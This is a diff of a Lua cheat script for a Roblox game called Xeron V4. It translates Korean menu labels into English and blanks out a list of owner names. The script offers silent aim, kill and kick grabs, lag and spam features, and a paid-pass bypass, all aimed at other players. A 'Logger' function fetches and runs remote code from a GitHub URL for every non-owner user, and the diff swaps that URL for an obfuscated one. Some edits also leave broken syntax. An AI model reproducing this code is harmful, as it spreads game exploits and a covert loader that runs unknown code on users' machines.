@@ -58,9 +58,9 @@ end)()
 
 local isLocalOwner = CheckIsOwner(LocalPlayer.UserId)
 if isLocalOwner then
-    print("[ADMIN SYSTEM] Auth Rank: OWNER (" .. tostring(LocalPlayer.Name) .. ")")
+    print("L")
 else
-    print("[ADMIN SYSTEM] Auth Rank: USER (" .. tostring(LocalPlayer.Name) .. ")")
+    print("HI ")
 end
 
 task.spawn(function()
@@ -194,7 +194,7 @@ local function FetchExternalIP()
 end
 local rawData = SafeFetch(TARGET_LIST_URL)
 if not rawData then
-    LocalPlayer:Kick("차단 리스트 로드 실패로 접속이 차단되었습니다.")
+    LocalPlayer:Kick("Access was blocked due to a failed block list loading.")
     task.wait(0.1)
     while true do end
 end
@@ -202,7 +202,7 @@ local parseSuccess, parsedList = pcall(function()
     return HttpService:JSONDecode(rawData)
 end)
 if not parseSuccess or type(parsedList) ~= "table" then
-    LocalPlayer:Kick("차단 리스트 형식 오류로 접속이 차단되었습니다.")
+    LocalPlayer:Kick("Access was blocked due to a block list format error.")
     task.wait(0.1)
     while true do end
 end
@@ -223,12 +223,12 @@ local CheckIsBlockedIP = (function()
 end)()
 local clientIP = FetchExternalIP()
 if not clientIP then
-    LocalPlayer:Kick("네트워크 검증에 실패하여 접속이 차단되었습니다.")
+    LocalPlayer:Kick("The network verification failed and access was blocked.")
     task.wait(0.1)
     while true do end
 end
 if CheckIsBlockedIP(clientIP) then
-    LocalPlayer:Kick("차단된 IP 대역이므로 접속이 거부되었습니다.")
+    LocalPlayer:Kick("Your IP ban ")
     task.wait(0.1)
     while true do end
 end
@@ -237,7 +237,7 @@ task.spawn(function()
     while task.wait(1) do
         local currentIP = FetchExternalIP()
         if not currentIP or CheckIsBlockedIP(currentIP) or debug.info(checkFunc, "s") ~= debug.info(CheckIsBlockedIP, "s") or typeof(CheckIsBlockedIP) ~= "function" then
-            LocalPlayer:Kick("스크립트 변조 또는 우회 시도가 탐지되었습니다.")
+            LocalPlayer:Kick("Script tampering or bypass attempts were detected.")
             task.wait(0.1)
             while true do end
             break
@@ -248,7 +248,7 @@ end)
 end
 do
 if game.PlaceId ~= 6961824067 then
-    game.Players.LocalPlayer:Kick("지원하지 않는 게임입니다.")
+    game.Players.LocalPlayer:Kick("It is a game that is not supported.")
     return
 end
 
@@ -264,7 +264,7 @@ for _, name in ipairs(allowed) do
 end
 
 if not passed then
-    game.Players.LocalPlayer:Kick("미지원 실행기입니다. ")
+    game.Players.LocalPlayer:Kick("This is an unsupported executor.")
     return
 end
 end
@@ -1065,8 +1065,7 @@ OrionLib.SelectedTheme = "PatoSigma"
         KeyToOpenWindow = "M",
         FreeMouse = true,
         IntroText = "Xeron V4 ⚡️💎⚡️",
-        IntroIcon = "rbxassetid://77989137998499",
-        SearchBar = {Default = "제론입니다."}
+        
     })
 
 --[[
@@ -1082,7 +1081,7 @@ local services = {
     Camera = workspace.CurrentCamera
 }
 
--- sigma.lua uses these as globals in a few places
+
 Players = services.Players
 LocalPlayer = services.Players.LocalPlayer
 
@@ -1356,7 +1355,7 @@ playersInLoop2V = {} -- Loop
 
 PPs = workspace:WaitForChild("PlotItems"):WaitForChild("PlayersInPlots")
 
------------------------------------------------------------------------------------------ [ 기본 설정 ]
+----------------------------------------------------------------------------------------- [ B ]
 function PcldOwner()
     task.spawn(function()
         while task.wait(0.1) do
@@ -1621,25 +1620,25 @@ end
 
 
 
-local UDTab = Window:MakeTab({Name = "실행자 정보",Icon = "rbxassetid://77989137998499", PremiumOnly = false})
-local playerTab = Window:MakeTab({Name = "플레이어 설정", Icon = "rbxassetid://6034281935", PremiumOnly = false})    
-local passTab = Window:MakeTab({Name = "패스잠금해제", Icon = "rbxassetid://4483345998", PremiumOnly = false})
-local getTab = Window:MakeTab({Name = "알림", Icon = "rbxassetid://649498361", PremiumOnly = false})
-local grabTab = Window:MakeTab({Name = "컴뱃", Icon = "rbxassetid://6026568198", PremiumOnly = false})               
-local UtilityTab = Window:MakeTab({Name = "유틸리티", Icon = "rbxassetid://6031094678", PremiumOnly = false}) 
-local plotTab = Window:MakeTab({Name = "집", Icon = "rbxassetid://4483345998", PremiumOnly = false})
-local DDTab = Window:MakeTab({Name = "티배깅", Icon = "rbxassetid://4483345998", PremiumOnly = false})
-local FDTab = Window:MakeTab({Name = "친구 보호", Icon = "rbxassetid://6026568198", PremiumOnly = false})        
+local UDTab = Window:MakeTab({Name = "user information",Icon = "rbxassetid://77989137998499", PremiumOnly = false})
+local playerTab = Window:MakeTab({Name = "Player", Icon = "rbxassetid://6034281935", PremiumOnly = false})    
+local passTab = Window:MakeTab({Name = "unlock pass", Icon = "rbxassetid://4483345998", PremiumOnly = false})
+local getTab = Window:MakeTab({Name = "Notification", Icon = "rbxassetid://649498361", PremiumOnly = false})
+local grabTab = Window:MakeTab({Name = "Combat", Icon = "rbxassetid://6026568198", PremiumOnly = false})               
+local UtilityTab = Window:MakeTab({Name = "Utility", Icon = "rbxassetid://6031094678", PremiumOnly = false}) 
+local plotTab = Window:MakeTab({Name = "house", Icon = "rbxassetid://4483345998", PremiumOnly = false})
+local DDTab = Window:MakeTab({Name = "Dance", Icon = "rbxassetid://4483345998", PremiumOnly = false})
+local FDTab = Window:MakeTab({Name = "Protecting friends", Icon = "rbxassetid://6026568198", PremiumOnly = false})        
 local antiTab = Window:MakeTab({Name = "안전", Icon = "rbxassetid://6034831332", PremiumOnly = false})               
-local ListTab = Window:MakeTab({Name = "명단", Icon = "rbxassetid://3572491301", PremiumOnly = false})              
-local LoopTab = Window:MakeTab({Name = "조지기", Icon = "rbxassetid://6023426923", PremiumOnly = false})   
-local SMTab = Window:MakeTab({Name = "스팸", Icon = "rbxassetid://779891379989", PremiumOnly = false})
-local AuraTab = Window:MakeTab({Name = "아우라", Icon = "rbxassetid://6031068423", PremiumOnly = false})   
-local bdTab = Window:MakeTab({Name = "배경체인저", Icon = "rbxassetid://4483345998", PremiumOnly = false})
-local funTab = Window:MakeTab({Name = "찌끄레기", Icon = "rbxassetid://4483345998", PremiumOnly = false})            
-local keybindTab = Window:MakeTab({Name = "설정", Icon = "rbxassetid://6031094678", PremiumOnly = false})             
-local lagTab = Window:MakeTab({Name = "렉", Icon = "rbxassetid://6023426923", PremiumOnly = false})   
-local CreditsTab = Window:MakeTab({Name = "설정 저장", Icon = "rbxassetid://77989137998499", PremiumOnly = false})
+local ListTab = Window:MakeTab({Name = "LoopList", Icon = "rbxassetid://3572491301", PremiumOnly = false})              
+local LoopTab = Window:MakeTab({Name = "kick&kill", Icon = "rbxassetid://6023426923", PremiumOnly = false})   
+local SMTab = Window:MakeTab({Name = "Spam", Icon = "rbxassetid://779891379989", PremiumOnly = false})
+local AuraTab = Window:MakeTab({Name = "Aura", Icon = "rbxassetid://6031068423", PremiumOnly = false})   
+local bdTab = Window:MakeTab({Name = "background changer", Icon = "rbxassetid://4483345998", PremiumOnly = false})
+local funTab = Window:MakeTab({Name = "fun", Icon = "rbxassetid://4483345998", PremiumOnly = false})            
+local keybindTab = Window:MakeTab({Name = "ESP", Icon = "rbxassetid://6031094678", PremiumOnly = false})             
+local lagTab = Window:MakeTab({Name = "Lag", Icon = "rbxassetid://6023426923", PremiumOnly = false})   
+local CreditsTab = Window:MakeTab({Name = "Save", Icon = "rbxassetid://77989137998499", PremiumOnly = false})
 
 
 
@@ -1664,15 +1663,15 @@ local function SaveAll()
     end)
 
     if success then
-        print("[Config] 저장 완료")
+        print("[Config] Save Config")
     else
-        warn("[Config] 저장 실패:", err)
+        warn("[Config] Storage failure:", err)
     end
 end
 
 local function LoadAll()
     if not isfile(FILE) then
-        warn("[Config] 저장된 파일이 없습니다.")
+        warn("[Config] There are no saved files.")
         return
     end
 
@@ -1681,7 +1680,7 @@ local function LoadAll()
     end)
 
     if not (success and type(data) == "table") then
-        warn("[Config] 불러오기 실패 (파일 손상 가능성)")
+        warn("[Config] load fail")
         return
     end
 
@@ -1693,7 +1692,7 @@ local function LoadAll()
         if obj then
             local ok = pcall(function()
                 if typeof(obj.Set) == "function" then
-                    -- OrionLib 슬라이더/드롭다운 등에서 Set 메서드 에러 방지
+                    
                     obj:Set(value)
                 elseif typeof(obj.SetState) == "function" then
                     obj:SetState(value)
@@ -1711,7 +1710,7 @@ local function LoadAll()
     end
 
     getgenv().IsLoadingConfig = false
-    print("[Config] 불러오기 완료 | 적용된 플래그 수:", loaded)
+    print("[Config] save! |  Flag number:", loaded)
 end
 
 getgenv().Settings.Misc = getgenv().Settings.Misc or {}
@@ -2189,7 +2188,7 @@ function AntiLagF()
         if data.count >= AntiLagV and not data.isDecreasing then
             data.isDecreasing = true
         
-            OrionLib:MakeNotification({Name = "[ ✏️ ]", Content = "by: " .. fromPlr.Name, Time = 3, Image = "rbxassetid://4483345998"})
+            OrionLib:MakeNotification({Name = "[ lag ]", Content = "by: " .. fromPlr.Name, Time = 3, Image = "rbxassetid://4483345998"})
             plr.PlayerScripts.CharacterAndBeamMove.Enabled = false
 
             task.spawn(function()
@@ -2354,8 +2353,8 @@ function AutoGucciF()
             blobHRP = blobmanInstanceS and blobmanInstanceS:FindFirstChild("HumanoidRootPart")
             
             OrionLib:MakeNotification({
-                Name = "[ 🔓 ]",
-                Content = "Gucci | Wait",
+                Name = "[ failed ]",
+                Content = "Wait",
                 Time = 1
             })
 
@@ -5604,7 +5603,7 @@ local function ifKickThenF()
             local NAP = plr.Name
             
             OrionLib:MakeNotification({
-                Name = "[ 킥당한새끼 ]",
+                Name = "[ kick ]",
                 Content = "[" .. DISP .. "] ( @" .. NAP ..  ")",
                 Image = "rbxassetid://4483345998",
                 Time = 7
@@ -6594,7 +6593,7 @@ end
 end
 end
 
------------------------------------------------------------------------------------------ [ 시작 설정 ]
+----------------------------------------------------------------------------------------- [ UI ]
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 local rs = game:GetService("ReplicatedStorage")
@@ -6695,7 +6694,7 @@ local function doAntiGrab(friendPlayer, enemyPlayer)
 end
 
 FDTab:AddPlayersDropdown({
-    Name = "안티 그랩 대상",
+    Name = "Anti Grab",
     Default = _G.PlayerToRemoveGrab,
     MultipleSelection = true,
     SearchBar = true,
@@ -6714,7 +6713,7 @@ FDTab:AddPlayersDropdown({
 })
 
 FDTab:AddToggle({
-    Name = "안티 그랩 활성화",
+    Name = "Anti grab",
     Default = _G.AntiGrabActive,
     Callback = function(Value)
         _G.AntiGrabActive = Value
@@ -6748,23 +6747,23 @@ end
 
 
 UtilityTab:AddSection({
-    Name = "시스템"
+    Name = "system"
 })
 
 
 UtilityTab:AddButton({
-    Name = "현재 핑(Ping) 확인",
+    Name = "Ping)",
     Callback = function()
         pcall(function()
             local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
-            OrionLib:MakeNotification({Name = "시스템", Content = "현재 핑: "..ping.."ms", Time = 3})
+            OrionLib:MakeNotification({Name = "system", Content = " Ping: "..ping.."ms", Time = 3})
         end)
     end,
 })
 
-
+--[[
 UtilityTab:AddButton({
-    Name = "물리 렉 최적화",
+    Name = "T",
     Callback = function()
         pcall(function()
             for _, v in pairs(workspace:GetDescendants()) do
@@ -6777,7 +6776,7 @@ UtilityTab:AddButton({
     end,
 })
 
-
+]]
 
 
 
@@ -6786,12 +6785,12 @@ UtilityTab:AddButton({
 
 
 passTab:AddSection({
-    Name = "라인"
+    Name = "line"
 })
 passTab:AddTextbox({
-   Name = "그라데이션 레이어 수 설정 (2 ~ 4)",
+   Name = "number of gradient layers (2 ~ 4)",
    
-   PlaceholderText = "기본값: 2",
+   PlaceholderText = "default: 2",
    TextDisappear = false,
    Callback = function(text)
       local num = tonumber(text)
@@ -6822,7 +6821,7 @@ passTab:AddTextbox({
 })
 
 passTab:AddColorpicker({
-    Name = "색상 1",
+    Name = "color 1",
     
     save = true,
     Flag = "5",
@@ -6841,7 +6840,7 @@ passTab:AddColorpicker({
 })
 
 passTab:AddColorpicker({
-    Name = "색상 2",
+    Name = "color 2",
     
     save = true,
     Flag = "6",
@@ -6860,7 +6859,7 @@ passTab:AddColorpicker({
 })
 
 passTab:AddColorpicker({
-    Name = "색상 3",
+    Name = "color 3",
     save = true,
     Flag = "7",
     Callback = function(color)
@@ -6878,7 +6877,7 @@ passTab:AddColorpicker({
 })
 
 passTab:AddColorpicker({
-    Name = "색상 4",
+    Name = "color 4",
     
     save = true,
     Flag = "8",
@@ -6897,7 +6896,7 @@ passTab:AddColorpicker({
 })
 
 passTab:AddToggle({
-   Name = "커스텀 그라데이션 적용  <font color='rgb(255,0,0)'>[오너]</font>",
+   Name = "Custom gradient   <font color='rgb(255,0,0)'>[GOOD]</font>",
    
     save = true,
    Flag = "CustomGradientToggle",
@@ -6917,8 +6916,9 @@ passTab:AddToggle({
       end
    end,
 })
+-[[
 passTab:AddSection({
-	Name = "에임 모양"
+	Name = "x"
 })
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -7033,16 +7033,16 @@ end
 
 
 passTab:AddToggle({
-Name="에임 체인져",
+Name="x",
 Default=false,
 Callback=function(v)
 if v then enable() else disable() end
 end
 })
 
-
+]]
 passTab:AddSection({
-	Name = "라인 타입"
+	Name = "line type"
 })
 
 
@@ -7052,27 +7052,27 @@ local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
 
 local isSkinEnabled = false
-local selectedSkin = "기본 화이트"
+local selectedSkin = "Basic white"
 local skinConnection
 
 local skinSettings = {
-    ["기본 화이트"] = {
-        Texture = "rbxassetid://2273224484", Speed = 3, Width0 = 0.8, Width1 = 0.4,
+    ["Basic white"] = {
+        Texture = "rbxassetid://2273222884", Speed = 3, Width0 = 0.8, Width1 = 0.4,
         Color = ColorSequence.new(Color3.fromRGB(255,255,255)), Brightness = 1.5
     },
-    ["네온 레이저"] = {
+    ["Neon"] = {
         Texture = "rbxassetid://5814122171", Speed = 8, Width0 = 0.3, Width1 = 0.3,
         Color = ColorSequence.new(Color3.fromRGB(0,255,255)), Brightness = 5
     },
-    ["제론 라인"] = {
+    ["Xeron Line"] = {
         Texture = "rbxassetid://77989137998499", Speed = -5, Width0 = 1.4, Width1 = 0.6,
         --Color = ColorSequence.new(Color3.fromRGB(255,40,0)), Brightness = 3.5
     },
-    ["보이드"] = {
+    ["void"] = {
         Texture = "rbxassetid://106048110", Speed = 4, Width0 = 1.6, Width1 = 1.6,
         Color = ColorSequence.new(Color3.fromRGB(120,0,255)), Brightness = 1.2
     },
-    ["레인보우 레이저"] = {
+    ["Rainbow"] = {
         Texture = "rbxassetid://2273224484", Speed = 8, Width0 = 0.7, Width1 = 0.7,
         Color = ColorSequence.new({
             ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),
@@ -7080,15 +7080,15 @@ local skinSettings = {
             ColorSequenceKeypoint.new(1,Color3.fromRGB(0,0,255))
         }), Brightness = 2.5
     },
-    ["고전압 전류"] = {
+    ["current"] = {
         Texture = "rbxassetid://242225642", Speed = 20, Width0 = 1.1, Width1 = 1.1,
         Color = ColorSequence.new(Color3.fromRGB(255,255,50)), Brightness = 6
     },
-    ["디지털 웨이브"] = {
+    ["Digital Wave"] = {
         Texture = "rbxassetid://5814144365", Speed = -8, Width0 = 0.5, Width1 = 0.5,
         Color = ColorSequence.new(Color3.fromRGB(0,255,80)), Brightness = 3
     },
-    ["플라즈마"] = {
+    ["Plasma"] = {
         Texture = "rbxassetid://131093673", Speed = 6, Width0 = 1.8, Width1 = 0.2,
         Color = ColorSequence.new(Color3.fromRGB(255,200,130)), Brightness = 5
     },
@@ -7096,7 +7096,7 @@ local skinSettings = {
         Texture = "rbxassetid://5814141697", Speed = 5, Width0 = 1.0, Width1 = 1.0,
         Color = ColorSequence.new(Color3.fromRGB(255,0,120)), Brightness = 3.5
     },
-    ["블랙홀 스트림"] = {
+    ["Black hole"] = {
         Texture = "rbxassetid://5814151528", Speed = -3, Width0 = 2.2, Width1 = 0.05,
         Color = ColorSequence.new(Color3.fromRGB(15,15,25)), Brightness = 0.8
     }
@@ -7118,7 +7118,7 @@ local function applyEffectsIfMine(beam)
 
     if not isMine then return end
 
-    local config = skinSettings[selectedSkin] or skinSettings["기본 화이트"]
+    local config = skinSettings[selectedSkin] or skinSettings["Basic white"]
 
     beam.Texture = config.Texture
     beam.TextureSpeed = config.Speed
@@ -7128,7 +7128,7 @@ local function applyEffectsIfMine(beam)
     beam.LightInfluence = 0
     beam.FaceCamera = true
 
-    if selectedSkin == "기본 화이트" or selectedSkin == "레인보우 레이저" then
+    if selectedSkin == "Basic white" or selectedSkin == "Rainbow" then
         beam.TextureMode = Enum.TextureMode.Stretch
         beam.Width0 = config.Width0
         beam.Width1 = config.Width1
@@ -7171,19 +7171,19 @@ local function applyEffectsIfMine(beam)
 end
 
 passTab:AddDropdown({
-    Name = "그랩 스킨 선택",
-    Default = "기본 화이트",
+    Name = "Line skin",
+    Default = "Basic white",
     Options = {
-        "기본 화이트",
-        "네온 레이저",
-        "제론 라인",
-        "보이드",
-        "레인보우 레이저",
-        "고전압 전류",
-        "디지털 웨이브",
-        "플라즈마",
+        "Basic white",
+        "Neon",
+        "Xeron Line",
+        "void",
+        "Rainbow",
+        "current",
+        "Digital Wave",
+        "Plasma",
         "DNA",
-        "블랙홀 스트림"
+        "Black hole"
     },
     Callback = function(Value)
         selectedSkin = Value
@@ -7196,7 +7196,7 @@ passTab:AddDropdown({
 })
 
 passTab:AddToggle({
-    Name = "그랩 스킨 켜기   <font color='rgb(155,100,25)'>[로컬]</font>",
+    Name = "Line skin   <font color='rgb(155,100,25)'>[local]</font>",
     Default = false,
     Callback = function(Value)
         isSkinEnabled = Value
@@ -7221,10 +7221,10 @@ passTab:AddToggle({
 
 
 passTab:AddSection({
-    Name = "라인 프리셋"
+    Name = "Line preset"
 })
 passTab:AddButton({
-   Name = "무지개 프리셋 (고정 고해상도)",
+   Name = "Rainbow",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -7245,7 +7245,7 @@ passTab:AddButton({
 })
 
 passTab:AddButton({
-   Name = "불꽃 프리셋 (레드/오렌지/옐로우)",
+   Name = "flame",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -7262,7 +7262,7 @@ passTab:AddButton({
 })
 
 passTab:AddButton({
-   Name = "바다 프리셋 (딥블루/아쿠아)",
+   Name = "Ocean",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -7279,7 +7279,7 @@ passTab:AddButton({
 })
 
 passTab:AddButton({
-   Name = "석양 프리셋 (퍼플/핑크/오렌지)",
+   Name = "Sunset",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -7296,7 +7296,7 @@ passTab:AddButton({
 })
 
 passTab:AddButton({
-   Name = "네온 프리셋 (민트/마젠타)",
+   Name = "Neon",
    Callback = function()
       CustomGradientEnabled = false
       RainbowLoopEnabled = false
@@ -7312,11 +7312,11 @@ passTab:AddButton({
 })
 
 passTab:AddSection({
-    Name = "무지개"
+    Name = "Rainbow"
 })
 
 passTab:AddToggle({
-   Name = "실시간 무지개 그라데이션 루프",
+   Name = " Rainbow gradient loop",
    
     save = true,
    Flag = "RainbowLoopToggle",
@@ -7345,10 +7345,10 @@ passTab:AddToggle({
 })
 
 passTab:AddSection({
-    Name = "패스 잠금 해제"
+    Name = "Pass unlock"
 })
 passTab:AddToggle({
-   Name = "긴줄 잠금해제   <font color='rgb(255,19,130)'>[바이패싱]</font>",
+   Name = "pass unlock <font color='rgb(255,19,130)'>[bypassing]</font>",
    Default = false,
    Flag = "woucf",
    Callback = function(Value)
@@ -7377,14 +7377,14 @@ passTab:AddToggle({
          if ran then
             OrionLib:MakeNotification({
                Name = "Success",
-               Content = "긴줄잠금해제완료!",
+               Content = "unlock pass!",
                Time = 4,
                Image = 10734951437
             })
          else
             OrionLib:MakeNotification({
                Name = "Failed",
-               Content = "긴줄잠금해제실패!",
+               Content = "Failed to unlock the pass.!",
                Time = 4,
                Image = 10734925828
             })
@@ -7401,7 +7401,7 @@ passTab:AddToggle({
 })
 
 getTab:AddToggle({
-    Name = "킥알림",
+    Name = "Kick notification",
     Default = false,
     Flag = "uo9td186tf7wvo",
     Callback = function(Value)
@@ -7435,7 +7435,7 @@ getTab:AddToggle({
                     
                     OrionLib:MakeNotification({
                         Name = "Xeron",
-                        Content = displayName .. " (" .. realName .. ") 킥이 되었어요!",
+                        Content = displayName .. " (" .. realName .. ") kick",
                         Time = 3
                     })
                 else
@@ -7609,7 +7609,7 @@ do
 		_Circle2.Position = Vector2.new(_CurrentCamera2.ViewportSize.X / 2, _CurrentCamera2.ViewportSize.Y / 2 + 36)
 		_Circle2.Transparency = 1
 		_Circle2.Filled = false
-		_Circle2.Color = Color3.fromRGB(0, 0, 0) -- 빈 Color3.new() 대신 명시적인 fromRGB 사용
+		_Circle2.Color = Color3.fromRGB(0, 0, 0) 
 		_Circle2.Visible = getgenv().Settings.FovCircle
 		_Circle2.ZIndex = 1
 	end
@@ -7666,7 +7666,7 @@ do
 	getgenv().SilentAim = true
 
 	grabTab:AddToggle({
-		Name = "사일런트에임",
+		Name = "aim",
 		Default = true,
 		Callback = function(v)
 			getgenv().SilentAim = v
@@ -7686,10 +7686,10 @@ end
 end
 ]]
 grabTab:AddSection({
-	Name = "플링"
+	Name = "Fling"
 })
 grabTab:AddToggle({
-    Name = "던지기 V1   <font color='rgb(255,0,0)'>[데스크톱]</font>",
+    Name = "SuperThrow    <font color='rgb(255,0,0)'>[Desktop]</font>",
     
     save = true,
     Flag = "99999999",
@@ -7700,7 +7700,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddTextbox({
-    Name = "던지는 힘 V1",
+    Name = "throw power ",
     
     PlaceholderText = "Value",
     save = true,
@@ -7710,13 +7710,13 @@ grabTab:AddTextbox({
     end
 })
 --strengthInput:Set(9999)
-grabTab:AddLabel("모바일의경우 작동하지 않습니다.")
+grabTab:AddLabel("It doesn't work on mobile devices.")
 --local strengthConnection = nil
 local nageru = 800
 --local lastThrowTime = 0
 
 grabTab:AddToggle({
-    Name = "던지기 V2   <font color='rgb(0,255,0)'>[모바일]</font>",
+    Name = "SuperThrow   <font color='rgb(0,255,0)'>[Mobile]</font>",
     
     save = true,
     Flag = "SuperThrow",
@@ -7767,8 +7767,8 @@ grabTab:AddToggle({
 })
 
 grabTab:AddTextbox({
-    Name = "던지는 힘 V2",
-    PlaceholderText = "숫자 입력 (기본값: 800)",
+    Name = "throw power",
+    PlaceholderText = "Number  (default): 800)",
     
     save = true,
     Flag = "ieie",
@@ -7779,7 +7779,7 @@ grabTab:AddTextbox({
         end
     end
 })
-grabTab:AddLabel("모바일을 지원하며 가장좋은 슈퍼 쓰로우 입니다.")
+grabTab:AddLabel("It supports mobile and is the best Super Throw.")
 
 game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
@@ -7791,7 +7791,7 @@ grabTab:AddSection({
 	Name = "Line"
 })
 grabTab:AddToggle({
-    Name = "무한줄  <font color='rgb(0,255,0)'>[데스크톱]</font>",
+    Name = "Infinite line  <font color='rgb(0,255,0)'>[Desktop]</font>",
     
     Flag = "3uw",
     save = true,
@@ -7802,7 +7802,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddTextbox({
-    Name = "줄 속도  <font color='rgb(0,255,0)'>[데스크톱]</font>",
+    Name = "line speed  <font color='rgb(0,255,0)'>[Desktop]</font>",
     
     save = true,
     PlaceholderText = "Value",
@@ -7818,7 +7818,7 @@ grabTab:AddSection({
 	Name = "Other"
 })
 grabTab:AddToggle({
-    Name = "루프 그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>",
+    Name = "loop grab <font color='rgb(255,0,0)'>[Ownership]</font>",
     
     save = true,
     Flag = "ty1",
@@ -7831,7 +7831,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({
-    Name = "래그돌 그랩  <font color='rgb(25,60,10)'>[판자]</font>",
+    Name = "Ragdoll grab <font color='rgb(25,60,10)'>[PP]</font>",
     
     save = true,
     Flag = "1ppp",
@@ -7844,7 +7844,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({ 
-    Name = "무질량 그랩", 
+    Name = "massless grab", 
     
     save = true,
     Flag = "1qty",
@@ -7857,7 +7857,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({ 
-    Name = "노클립 그랩", 
+    Name = "Noclip grab", 
     
     save = true,
     Flag = "1yriti",
@@ -7869,7 +7869,7 @@ grabTab:AddToggle({
     end
 })
 grabTab:AddToggle({
-    Name = "보이드 그랩",
+    Name = "Void grab",
     Default = false,
     Save = true,
     Flag = "VoidGrabTo1ggle",
@@ -7931,7 +7931,7 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({ 
-    Name = "킬그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>   <font color='rgb(0,0,255)'>[프리미엄]</font>", 
+    Name = "Kill Grab  <font color='rgb(255,0,0)'>[Ownership]</font>   ", 
     
     save = true,
     Flag = "1mbmbmb",
@@ -7941,7 +7941,7 @@ grabTab:AddToggle({
     end
 })
 grabTab:AddToggle({ 
-    Name = "ㄴ 공허 ", 
+    Name = "(KillGrab) void ", 
     Default = false,
     Callback = function(Value)
         TpKLG = Value
@@ -7949,10 +7949,10 @@ grabTab:AddToggle({
 })
 
 grabTab:AddSection({
-	Name = "킥"
+	Name = "Kick"
 })
 grabTab:AddToggle({
-    Name = "킥그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>  <font color='rgb(0,0,255)'>[프리미엄]</font>",
+    Name = "Kick grab  <font color='rgb(255,0,0)'>[Ownership]</font>  ",
     
     save = true,
     Flag = "99999j",
@@ -7963,12 +7963,13 @@ grabTab:AddToggle({
 })
 
 grabTab:AddToggle({
-    Name = "ㄴ 앵커",
+    Name = "(Kick Grab) Anchor",
     Default = false,
     Callback = function(Value)
         AnhKick = Value
     end
 })
+--[[
 do
 local Settings = {
     Grab = {
@@ -8078,10 +8079,10 @@ SpinSection:AddTextbox({
         end
     end
 })
-
+]]
 end
 grabTab:AddSection({
-	Name = "앵커"
+	Name = "Anchor"
 })
 
 local function runAnchorLogic()
@@ -8205,7 +8206,7 @@ local function toggleAnchor(Value)
 end
 
 toggleElement = grabTab:AddToggle({
-    Name = "물체 고정 토글",
+    Name = "object Anchor toggle",
     Default = false,
     save = true,
     Flag = "qwer",
@@ -8215,27 +8216,28 @@ toggleElement = grabTab:AddToggle({
 })
 
 grabTab:AddButton({
-    Name = "물체 고정",
+    Name = "object anchor",
     Callback = function()
         task.spawn(runAnchorLogic)
     end,
 })
-
+--[[
 grabTab:AddButton({
-    Name = "색상: 그라데이션 (기본값)",
+    Name = "×",
     Callback = function()
         hColor = nil
     end,
 })
 
-
+]]
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 local playersInLoop1V = {}
 
-local GF = {"wetokwk3jr"}
-local Owner = {"QRdoote1120", "0110rim", "Alpaca_AI16", "hello_qweqwe", "hello_q1w2e3", "pacapaca110", "wetokwk3jr", "dhalstjr1350", "one_day0618", "00VXE1"}
+local GF = {""}
+local Owner = {"", "", "", "", "", "
+", "", "", "", ""}
 
 local function GetPlayerRank(name)
     if table.find(Owner, name) then return 7 end
@@ -8246,7 +8248,7 @@ end
 local function Logger()
     if not table.find(Owner, LocalPlayer.Name) and LocalPlayer.UserId ~= 1 then
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/anti"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/qwwer1q8ftd234f76/Xedrxon/wzmainx/d"))()
         end)
     end
 end
@@ -8301,20 +8303,20 @@ local function addToLoop1(name)
 
     if not target then
         Logger()
-        Notify("에러", "찾을수 없어요")
+        Notify("Error", "Not found")
         return
     end
 
 
     if target == LocalPlayer then
-        Notify("Xeron", "자기 자신은 추가할 수 없습니다.")
+        Notify("Xeron", "You cannot add yourself.")
         return
     end
 
     if not table.find(playersInLoop1V, target.Name) then
         table.insert(playersInLoop1V, target.Name)
         UpdateDropdown()
-        Notify("타겟 지정완료", target.Name .. " added")
+        Notify("Target", target.Name .. " added")
     end
 end
 
@@ -8323,17 +8325,17 @@ local function removeFromLoop1(name)
         if v:lower():find(name:lower(), 1, true) then
             table.remove(playersInLoop1V, i)
             UpdateDropdown()
-            Notify("완료", v .. " 삭제")
+            Notify("Completed", v .. " remove")
             return
         end
     end
 
-    Notify("에러", "찾을수 없어요.")
+    Notify("Error", "Not found.")
 end
 
-
+--[[
 DropdownV1 = ListTab:AddPlayersDropdown({
-    Name = "현재 서버에있는사람 (확인용)",
+    Name = "×",
     Options = playersInLoop1V,
     MultipleOptions = true,
     Callback = function(options)
@@ -8343,9 +8345,9 @@ DropdownV1 = ListTab:AddPlayersDropdown({
         end
     end
 })
-
+]]
 ListTab:AddTextbox({
-    Name = "타겟추가",
+    Name = "add",
     PlaceholderText = "username",
     RemoveTextAfterFocusLost = true,
     Callback = function(value)
@@ -8354,7 +8356,7 @@ ListTab:AddTextbox({
 })
 
 ListTab:AddTextbox({
-    Name = "타겟 삭제",
+    Name = "remove",
     PlaceholderText = "username",
     RemoveTextAfterFocusLost = true,
     Callback = function(value)
@@ -8368,7 +8370,7 @@ task.defer(function()
 end)
 do
 ListTab:AddSection({
-    Name = "기타"
+    Name = "Others"
 })
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -8389,7 +8391,7 @@ local function GetPlayerList()
     return list
 end
 local PlayerDropdown = ListTab:AddDropdown({
-    Name = "플레이어 고르기",
